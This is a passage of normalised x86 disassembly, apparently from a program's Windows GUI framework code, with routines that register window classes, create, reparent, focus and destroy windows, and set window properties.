cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41891c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4188a0
mov edx eax
mov ecx ebx
mov eax edi
call sub_44b824
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44be60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44c4e4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44c4a8
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44c4a8
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44beb4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44be60
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bf93
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44bcf0
pop ecx
push ebp
mov al 0x2
call sub_44bcf0
pop ecx
push ebp
mov al 0x3
call sub_44bcf0
pop ecx
push ebp
mov al 0x4
call sub_44bcf0
pop ecx
push ebp
mov al 0x5
call sub_44bcf0
pop ecx
push ebp
mov al 0x6
call sub_44bcf0
pop ecx
push ebp
xor eax eax
call sub_44bcf0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403564
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44bfb8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor eax eax
push ebp
push sub_44c03f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44c07c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c141
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4489b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c148
mov eax [ ebp - 0xc ]
call sub_403368
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418744
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4486fc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4188a0
xor ecx ecx
mov edx 0xb03e
call sub_44a180
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44c150
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c4e4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44c04c
xor edx edx
push ebp
push sub_44c237
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418744
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4188a0
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403368
mov eax [ ebp - 0x4 ]
call sub_44c054
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_4484a0
mov dl 0x4
call sub_4484a0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418790
sub_44c2a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45fd40
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_463a64
sub_44c2c4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_447880
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_447880
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_447880
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44c310
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4478a8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4478a8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4478a8
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44c358
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403564
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44a180
mov edx ebx
mov eax edi
call sub_44c2c4
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44a180
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44a180
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a180
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
call sub_44fab8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44a180
mov eax edi
call sub_44cea8
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44bfb8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c42c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44a180
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44c2a4
mov eax ebp
call sub_44cd0c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44c310
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44a180
mov eax esi
call sub_44c074
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493fc
sub_44c4a8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4188a0
mov edx edi
mov eax ebp
call sub_4188a0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44c504
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44c4a8
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44c544
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44c504
add esp 0x10
retn
sub_44c56c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44c5d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_449610
test al al
je r-xdata
mov eax ebx
call sub_449640
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403564
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403564
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403564
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44c640
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44c75e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402d24
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c5d8
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_44f7b4
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408a68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c765
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_44c76c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44c92d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_445d80
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_445d80
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cf34
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cf34
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408c08
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_44fac4
push 0x1
mov eax [ esi + 0x68 ]
call sub_4241ec
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44a180
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_44f7b4
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c934
lea eax [ ebp - 0xc0 ]
call sub_404164
retn
mov eax esi
mov si 0xffee
call sub_403564
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44c93c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406e8c
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44c97c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cf08
mov eax esi
call sub_41ce58
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41ce58
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41cf10
pop esi
pop ebx
retn
sub_44c9b4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f114
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f048
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f048
mov eax esi
call sub_41f11c
add esp 0x10
pop esi
pop ebx
retn
sub_44ca1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44ca08
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4188a0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188a0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44caf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44a4b8
mov eax [ ebp - 0x8 ]
push eax
push sub_44c97c
mov eax [ ebp - 0x8 ]
push eax
push sub_44c9b4
push ebp
call sub_44ca1c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44cb50
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448f28
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408bbc
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408bd0
mov ecx eax
mov edx edi
mov eax ebx
call sub_448f38
mov eax r-xdata
call sub_408bdc
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4479b4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44cba8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push j_sub_403ae4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cbfc
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cf34
sub_44cc0c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4188fc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4188a0
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44cc54
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44cc0c
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44c4a8
call sub_4485e0
inc edi
dec esi
jne r-xdata
sub_44ccf0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44cd0c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4188a0
call sub_44cd0c
inc edi
dec esi
jne r-xdata
sub_44cd6c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403564
mov ebx eax
mov eax edi
call sub_44cd0c
mov eax edi
call sub_44cea8
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44cdac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_403830#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44a180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188a0
call sub_44cdac
inc esi
dec ebx
jne r-xdata
sub_44cea8
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cdac
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44cee8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44cd0c
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44cea8
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406e74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a180
jmp r-xdata
sub_44cf70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403830#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44cfb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cfbe
call sub_4479b4
call sub_426aa0
retn
sub_44cfe8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
